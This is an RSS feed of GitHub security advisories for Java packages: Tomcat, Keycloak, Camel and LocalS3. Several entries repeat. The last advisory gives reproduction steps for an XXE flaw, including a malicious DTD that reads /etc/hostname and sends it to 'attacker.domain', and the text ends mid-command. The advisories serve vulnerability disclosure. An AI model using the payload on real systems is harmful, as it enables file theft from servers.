<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2025-03-11T09:01:36.449Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat-catalina] Apache Tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT]]></title>
        <id>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</id>
        <link href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg"/>
        <updated>2025-03-10T22:25:03.000Z</updated>
        <content type="html"><![CDATA[<p>Path Equivalence: 'file.Name' (Internal Dot) leading to&nbsp;Remote Code Execution and/or Information disclosure&nbsp;and/or malicious content added to uploaded files via write enabled&nbsp;Default Servlet&nbsp;in Apache Tomcat.</p>
<p>This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.</p>
<p>If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files:
-&nbsp;writes enabled for the default servlet (disabled by default)</p>
<ul>
<li>support for partial PUT (enabled by default)</li>
<li>a target URL for security sensitive uploads that was a sub-directory of&nbsp;a target URL for public uploads
-&nbsp;attacker knowledge of the names of security sensitive files being&nbsp;uploaded
-&nbsp;the security sensitive files also being uploaded via partial PUT</li>
</ul>
<p>If all of the following were true, a malicious user was able to perform remote code execution:</p>
<ul>
<li>writes enabled for the default servlet (disabled by default)
-&nbsp;support for partial PUT (enabled by default)
-&nbsp;application was using Tomcat's file based session persistence with the&nbsp;default storage location
-&nbsp;application included a library that may be leveraged in a&nbsp;deserialization attack</li>
</ul>
<p>Users are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.98, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24813">https://nvd.nist.gov/vuln/detail/CVE-2025-24813</a></li>
<li><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/10/5">http://www.openwall.com/lists/oss-security/2025/03/10/5</a></li>
<li><a href="https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c">https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c</a></li>
<li><a href="https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72">https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72</a></li>
<li><a href="https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc">https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc</a></li>
<li><a href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg">https://github.com/advisories/GHSA-83qj-6fr2-vhqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-10T18:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat-catalina] Apache Tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT]]></title>
        <id>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</id>
        <link href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg"/>
        <updated>2025-03-10T22:25:03.000Z</updated>
        <content type="html"><![CDATA[<p>Path Equivalence: 'file.Name' (Internal Dot) leading to&nbsp;Remote Code Execution and/or Information disclosure&nbsp;and/or malicious content added to uploaded files via write enabled&nbsp;Default Servlet&nbsp;in Apache Tomcat.</p>
<p>This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.</p>
<p>If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files:
-&nbsp;writes enabled for the default servlet (disabled by default)</p>
<ul>
<li>support for partial PUT (enabled by default)</li>
<li>a target URL for security sensitive uploads that was a sub-directory of&nbsp;a target URL for public uploads
-&nbsp;attacker knowledge of the names of security sensitive files being&nbsp;uploaded
-&nbsp;the security sensitive files also being uploaded via partial PUT</li>
</ul>
<p>If all of the following were true, a malicious user was able to perform remote code execution:</p>
<ul>
<li>writes enabled for the default servlet (disabled by default)
-&nbsp;support for partial PUT (enabled by default)
-&nbsp;application was using Tomcat's file based session persistence with the&nbsp;default storage location
-&nbsp;application included a library that may be leveraged in a&nbsp;deserialization attack</li>
</ul>
<p>Users are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.98, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24813">https://nvd.nist.gov/vuln/detail/CVE-2025-24813</a></li>
<li><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/10/5">http://www.openwall.com/lists/oss-security/2025/03/10/5</a></li>
<li><a href="https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c">https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c</a></li>
<li><a href="https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72">https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72</a></li>
<li><a href="https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc">https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc</a></li>
<li><a href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg">https://github.com/advisories/GHSA-83qj-6fr2-vhqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-10T18:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.tomcat:tomcat-catalina] Apache Tomcat: Potential RCE and/or information disclosure and/or information corruption with partial PUT]]></title>
        <id>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</id>
        <link href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg"/>
        <updated>2025-03-10T22:25:03.000Z</updated>
        <content type="html"><![CDATA[<p>Path Equivalence: 'file.Name' (Internal Dot) leading to&nbsp;Remote Code Execution and/or Information disclosure&nbsp;and/or malicious content added to uploaded files via write enabled&nbsp;Default Servlet&nbsp;in Apache Tomcat.</p>
<p>This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.</p>
<p>If all of the following were true, a malicious user was able to view security sensitive files and/or inject content into those files:
-&nbsp;writes enabled for the default servlet (disabled by default)</p>
<ul>
<li>support for partial PUT (enabled by default)</li>
<li>a target URL for security sensitive uploads that was a sub-directory of&nbsp;a target URL for public uploads
-&nbsp;attacker knowledge of the names of security sensitive files being&nbsp;uploaded
-&nbsp;the security sensitive files also being uploaded via partial PUT</li>
</ul>
<p>If all of the following were true, a malicious user was able to perform remote code execution:</p>
<ul>
<li>writes enabled for the default servlet (disabled by default)
-&nbsp;support for partial PUT (enabled by default)
-&nbsp;application was using Tomcat's file based session persistence with the&nbsp;default storage location
-&nbsp;application included a library that may be leveraged in a&nbsp;deserialization attack</li>
</ul>
<p>Users are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.98, which fixes the issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24813">https://nvd.nist.gov/vuln/detail/CVE-2025-24813</a></li>
<li><a href="https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq">https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/10/5">http://www.openwall.com/lists/oss-security/2025/03/10/5</a></li>
<li><a href="https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c">https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c</a></li>
<li><a href="https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72">https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72</a></li>
<li><a href="https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc">https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc</a></li>
<li><a href="https://github.com/advisories/GHSA-83qj-6fr2-vhqg">https://github.com/advisories/GHSA-83qj-6fr2-vhqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83qj-6fr2-vhqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-10T18:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.keycloak:keycloak-services] Improper Authorization in Keycloak Organization Mapper Allows Unauthorized Organization Claims ]]></title>
        <id>https://github.com/advisories/GHSA-gvgg-2r3r-53x7</id>
        <link href="https://github.com/advisories/GHSA-gvgg-2r3r-53x7"/>
        <updated>2025-03-10T21:09:44.000Z</updated>
        <content type="html"><![CDATA[<p>This vulnerability is caused by the improper mapping of users to organizations based solely on email/username patterns. The issue is limited to the token claim level, meaning the user is not truly added to the organization but may appear as such in applications relying on these claims. The risk increases in scenarios where self-registration is enabled and unrestricted, allowing an attacker to exploit the naming pattern. The issue is mitigated if admins restrict registration or use strict validation mechanisms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-gvgg-2r3r-53x7">https://github.com/keycloak/keycloak/security/advisories/GHSA-gvgg-2r3r-53x7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1391">https://nvd.nist.gov/vuln/detail/CVE-2025-1391</a></li>
<li><a href="https://github.com/keycloak/keycloak/commit/5aa2b4c75bb474303ab807017582bc01a9f7e378">https://github.com/keycloak/keycloak/commit/5aa2b4c75bb474303ab807017582bc01a9f7e378</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2545">https://access.redhat.com/errata/RHSA-2025:2545</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-1391">https://access.redhat.com/security/cve/CVE-2025-1391</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2346082">https://bugzilla.redhat.com/show_bug.cgi?id=2346082</a></li>
<li><a href="https://github.com/advisories/GHSA-gvgg-2r3r-53x7">https://github.com/advisories/GHSA-gvgg-2r3r-53x7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gvgg-2r3r-53x7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T21:09:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.keycloak:keycloak-services] Improper Authorization in Keycloak Organization Mapper Allows Unauthorized Organization Claims ]]></title>
        <id>https://github.com/advisories/GHSA-gvgg-2r3r-53x7</id>
        <link href="https://github.com/advisories/GHSA-gvgg-2r3r-53x7"/>
        <updated>2025-03-10T21:09:44.000Z</updated>
        <content type="html"><![CDATA[<p>This vulnerability is caused by the improper mapping of users to organizations based solely on email/username patterns. The issue is limited to the token claim level, meaning the user is not truly added to the organization but may appear as such in applications relying on these claims. The risk increases in scenarios where self-registration is enabled and unrestricted, allowing an attacker to exploit the naming pattern. The issue is mitigated if admins restrict registration or use strict validation mechanisms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-gvgg-2r3r-53x7">https://github.com/keycloak/keycloak/security/advisories/GHSA-gvgg-2r3r-53x7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1391">https://nvd.nist.gov/vuln/detail/CVE-2025-1391</a></li>
<li><a href="https://github.com/keycloak/keycloak/commit/5aa2b4c75bb474303ab807017582bc01a9f7e378">https://github.com/keycloak/keycloak/commit/5aa2b4c75bb474303ab807017582bc01a9f7e378</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2545">https://access.redhat.com/errata/RHSA-2025:2545</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-1391">https://access.redhat.com/security/cve/CVE-2025-1391</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2346082">https://bugzilla.redhat.com/show_bug.cgi?id=2346082</a></li>
<li><a href="https://github.com/advisories/GHSA-gvgg-2r3r-53x7">https://github.com/advisories/GHSA-gvgg-2r3r-53x7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gvgg-2r3r-53x7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T21:09:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.keycloak:keycloak-ldap-federation] Authentication Bypass Due to Missing LDAP Bind After Password Reset in Keycloak]]></title>
        <id>https://github.com/advisories/GHSA-2p82-5wwr-43cw</id>
        <link href="https://github.com/advisories/GHSA-2p82-5wwr-43cw"/>
        <updated>2025-03-10T21:07:32.000Z</updated>
        <content type="html"><![CDATA[<p>The issue arises because Keycloak does not perform an LDAP bind after a password reset, leading to potential authentication bypass for expired or disabled AD accounts. A fix should enforce LDAP validation after password updates to ensure consistency with AD authentication policies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-2p82-5wwr-43cw">https://github.com/keycloak/keycloak/security/advisories/GHSA-2p82-5wwr-43cw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0604">https://nvd.nist.gov/vuln/detail/CVE-2025-0604</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2545">https://access.redhat.com/errata/RHSA-2025:2545</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-0604">https://access.redhat.com/security/cve/CVE-2025-0604</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2338993">https://bugzilla.redhat.com/show_bug.cgi?id=2338993</a></li>
<li><a href="https://github.com/advisories/GHSA-2p82-5wwr-43cw">https://github.com/advisories/GHSA-2p82-5wwr-43cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p82-5wwr-43cw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T21:07:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.keycloak:keycloak-ldap-federation] Authentication Bypass Due to Missing LDAP Bind After Password Reset in Keycloak]]></title>
        <id>https://github.com/advisories/GHSA-2p82-5wwr-43cw</id>
        <link href="https://github.com/advisories/GHSA-2p82-5wwr-43cw"/>
        <updated>2025-03-10T21:07:32.000Z</updated>
        <content type="html"><![CDATA[<p>The issue arises because Keycloak does not perform an LDAP bind after a password reset, leading to potential authentication bypass for expired or disabled AD accounts. A fix should enforce LDAP validation after password updates to ensure consistency with AD authentication policies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/keycloak/keycloak/security/advisories/GHSA-2p82-5wwr-43cw">https://github.com/keycloak/keycloak/security/advisories/GHSA-2p82-5wwr-43cw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0604">https://nvd.nist.gov/vuln/detail/CVE-2025-0604</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:2545">https://access.redhat.com/errata/RHSA-2025:2545</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-0604">https://access.redhat.com/security/cve/CVE-2025-0604</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2338993">https://bugzilla.redhat.com/show_bug.cgi?id=2338993</a></li>
<li><a href="https://github.com/advisories/GHSA-2p82-5wwr-43cw">https://github.com/advisories/GHSA-2p82-5wwr-43cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p82-5wwr-43cw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T21:07:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.camel:camel-support] Apache Camel: Camel Message Header Injection via Improper Filtering]]></title>
        <id>https://github.com/advisories/GHSA-2c2h-2855-mf97</id>
        <link href="https://github.com/advisories/GHSA-2c2h-2855-mf97"/>
        <updated>2025-03-10T21:06:46.000Z</updated>
        <content type="html"><![CDATA[<p>Bypass/Injection vulnerability in Apache Camel-Bean component under particular conditions.</p>
<p>This issue affects Apache Camel: from 4.9.0 through &lt;= 4.10.1, from 4.0.0-M1 through &lt;= 4.8.4, from 3.10.0 through &lt;= 3.22.3.</p>
<p>Users are recommended to upgrade to version 4.10.2 for 4.10.x LTS, 4.8.5 for 4.8.x LTS and 3.22.4 for 3.x releases.</p>
<p>This vulnerability is only present in the following situation. The user is using one of the following HTTP Servers via one the of the following Camel components</p>
<ul>
<li>camel-servlet</li>
<li>camel-jetty</li>
<li>camel-undertow</li>
<li>camel-platform-http</li>
<li>camel-netty-http</li>
</ul>
<p>and in the route, the exchange will be routed to a camel-bean producer. So ONLY camel-bean component is affected. In particular:&nbsp;</p>
<ul>
<li><p>The bean invocation (is only affected if you use any of the above&nbsp;together with camel-bean component).</p>
</li>
<li><p>The bean that can be called, has&nbsp;more than 1 method implemented.
In these conditions an attacker could be able to forge a Camel header name and make the bean component invoking other methods in the same bean.</p>
</li>
</ul>
<p>The vulnerability arises due to a bug in the default filtering mechanism that only blocks headers starting with "Camel", "camel", or "org.apache.camel.".&nbsp;</p>
<p>Mitigation:&nbsp;You can easily work around this in your Camel applications by removing the&nbsp;headers in your Camel routes. There are many ways of doing this, also&nbsp;globally or per route. This means you could use the removeHeaders EIP, to filter out anything like "cAmel, cAMEL" etc, or in general everything not starting with "Camel", "camel" or "org.apache.camel.".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27636">https://nvd.nist.gov/vuln/detail/CVE-2025-27636</a></li>
<li><a href="https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z">https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/09/1">http://www.openwall.com/lists/oss-security/2025/03/09/1</a></li>
<li><a href="https://issues.apache.org/jira/browse/CAMEL-21828">https://issues.apache.org/jira/browse/CAMEL-21828</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-27636.html">https://camel.apache.org/security/CVE-2025-27636.html</a></li>
<li><a href="https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf">https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf</a></li>
<li><a href="https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624">https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624</a></li>
<li><a href="https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java">https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java</a></li>
<li><a href="https://github.com/advisories/GHSA-2c2h-2855-mf97">https://github.com/advisories/GHSA-2c2h-2855-mf97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c2h-2855-mf97</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-09T15:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.camel:camel-support] Apache Camel: Camel Message Header Injection via Improper Filtering]]></title>
        <id>https://github.com/advisories/GHSA-2c2h-2855-mf97</id>
        <link href="https://github.com/advisories/GHSA-2c2h-2855-mf97"/>
        <updated>2025-03-10T21:06:46.000Z</updated>
        <content type="html"><![CDATA[<p>Bypass/Injection vulnerability in Apache Camel-Bean component under particular conditions.</p>
<p>This issue affects Apache Camel: from 4.9.0 through &lt;= 4.10.1, from 4.0.0-M1 through &lt;= 4.8.4, from 3.10.0 through &lt;= 3.22.3.</p>
<p>Users are recommended to upgrade to version 4.10.2 for 4.10.x LTS, 4.8.5 for 4.8.x LTS and 3.22.4 for 3.x releases.</p>
<p>This vulnerability is only present in the following situation. The user is using one of the following HTTP Servers via one the of the following Camel components</p>
<ul>
<li>camel-servlet</li>
<li>camel-jetty</li>
<li>camel-undertow</li>
<li>camel-platform-http</li>
<li>camel-netty-http</li>
</ul>
<p>and in the route, the exchange will be routed to a camel-bean producer. So ONLY camel-bean component is affected. In particular:&nbsp;</p>
<ul>
<li><p>The bean invocation (is only affected if you use any of the above&nbsp;together with camel-bean component).</p>
</li>
<li><p>The bean that can be called, has&nbsp;more than 1 method implemented.
In these conditions an attacker could be able to forge a Camel header name and make the bean component invoking other methods in the same bean.</p>
</li>
</ul>
<p>The vulnerability arises due to a bug in the default filtering mechanism that only blocks headers starting with "Camel", "camel", or "org.apache.camel.".&nbsp;</p>
<p>Mitigation:&nbsp;You can easily work around this in your Camel applications by removing the&nbsp;headers in your Camel routes. There are many ways of doing this, also&nbsp;globally or per route. This means you could use the removeHeaders EIP, to filter out anything like "cAmel, cAMEL" etc, or in general everything not starting with "Camel", "camel" or "org.apache.camel.".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27636">https://nvd.nist.gov/vuln/detail/CVE-2025-27636</a></li>
<li><a href="https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z">https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/09/1">http://www.openwall.com/lists/oss-security/2025/03/09/1</a></li>
<li><a href="https://issues.apache.org/jira/browse/CAMEL-21828">https://issues.apache.org/jira/browse/CAMEL-21828</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-27636.html">https://camel.apache.org/security/CVE-2025-27636.html</a></li>
<li><a href="https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf">https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf</a></li>
<li><a href="https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624">https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624</a></li>
<li><a href="https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java">https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java</a></li>
<li><a href="https://github.com/advisories/GHSA-2c2h-2855-mf97">https://github.com/advisories/GHSA-2c2h-2855-mf97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c2h-2855-mf97</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-09T15:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.apache.camel:camel-support] Apache Camel: Camel Message Header Injection via Improper Filtering]]></title>
        <id>https://github.com/advisories/GHSA-2c2h-2855-mf97</id>
        <link href="https://github.com/advisories/GHSA-2c2h-2855-mf97"/>
        <updated>2025-03-10T21:06:46.000Z</updated>
        <content type="html"><![CDATA[<p>Bypass/Injection vulnerability in Apache Camel-Bean component under particular conditions.</p>
<p>This issue affects Apache Camel: from 4.9.0 through &lt;= 4.10.1, from 4.0.0-M1 through &lt;= 4.8.4, from 3.10.0 through &lt;= 3.22.3.</p>
<p>Users are recommended to upgrade to version 4.10.2 for 4.10.x LTS, 4.8.5 for 4.8.x LTS and 3.22.4 for 3.x releases.</p>
<p>This vulnerability is only present in the following situation. The user is using one of the following HTTP Servers via one the of the following Camel components</p>
<ul>
<li>camel-servlet</li>
<li>camel-jetty</li>
<li>camel-undertow</li>
<li>camel-platform-http</li>
<li>camel-netty-http</li>
</ul>
<p>and in the route, the exchange will be routed to a camel-bean producer. So ONLY camel-bean component is affected. In particular:&nbsp;</p>
<ul>
<li><p>The bean invocation (is only affected if you use any of the above&nbsp;together with camel-bean component).</p>
</li>
<li><p>The bean that can be called, has&nbsp;more than 1 method implemented.
In these conditions an attacker could be able to forge a Camel header name and make the bean component invoking other methods in the same bean.</p>
</li>
</ul>
<p>The vulnerability arises due to a bug in the default filtering mechanism that only blocks headers starting with "Camel", "camel", or "org.apache.camel.".&nbsp;</p>
<p>Mitigation:&nbsp;You can easily work around this in your Camel applications by removing the&nbsp;headers in your Camel routes. There are many ways of doing this, also&nbsp;globally or per route. This means you could use the removeHeaders EIP, to filter out anything like "cAmel, cAMEL" etc, or in general everything not starting with "Camel", "camel" or "org.apache.camel.".</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27636">https://nvd.nist.gov/vuln/detail/CVE-2025-27636</a></li>
<li><a href="https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z">https://lists.apache.org/thread/l3zcg3vts88bmc7w8172wkgw610y693z</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/09/1">http://www.openwall.com/lists/oss-security/2025/03/09/1</a></li>
<li><a href="https://issues.apache.org/jira/browse/CAMEL-21828">https://issues.apache.org/jira/browse/CAMEL-21828</a></li>
<li><a href="https://camel.apache.org/security/CVE-2025-27636.html">https://camel.apache.org/security/CVE-2025-27636.html</a></li>
<li><a href="https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf">https://github.com/apache/camel/commit/23a833eec6131a3cdce6e4b1b40b3ac2035b6adf</a></li>
<li><a href="https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624">https://github.com/apache/camel/commit/45a6b74f7f8af8fd58f197566938a9534392a624</a></li>
<li><a href="https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java">https://github.com/apache/camel/blob/camel-4.9.0/core/camel-support/src/main/java/org/apache/camel/support/DefaultHeaderFilterStrategy.java</a></li>
<li><a href="https://github.com/advisories/GHSA-2c2h-2855-mf97">https://github.com/advisories/GHSA-2c2h-2855-mf97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c2h-2855-mf97</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-09T15:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 XML Parser Vulnerable to XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-47qw-ccjm-9c2c</id>
        <link href="https://github.com/advisories/GHSA-47qw-ccjm-9c2c"/>
        <updated>2025-03-10T18:29:38.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project, which implements an S3-compatible storage interface, contains a critical XML External Entity (XXE) Injection vulnerability in its XML parsing functionality. When processing XML requests for multipart upload operations, the application accepts and processes XML external entities, allowing an attacker to read local system files and potentially make outbound network connections.</p>
<p>The vulnerability exists because the XML parser is configured to process external entities and DTD (Document Type Definition) declarations without proper restrictions. This allows an attacker to define external entities that can read local files and exfiltrate their contents through outbound HTTP requests.</p>
<p>The vulnerability is particularly severe as it allows direct access to sensitive files on the filesystem, bypassing any directory traversal protections that might be in place for normal S3 operations.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create a malicious DTD file containing the following content:</li>
</ol>
<pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker.domain/?flag=%file;'&gt;"&gt;
%eval;
%exfil;
</code></pre>
<ol start="2">
<li><p>Host the malicious DTD file on an accessible web server</p>
</li>
<li><p>Initialize a multipart upload to the LocalS3 server:</p>
</li>
</ol>
<pre><code>curl -X PUT "http://app/test-bucket/test.txt?uploads"
</code></pre>
<ol start="4">
<li>Send a POST request to complete the multipart upload with the following XML payload:<pre><code>curl -X POST "http://app/test-bucket/test.txt?uploadId=[upload-id]" \
-H "Content-Type: application/xml" \
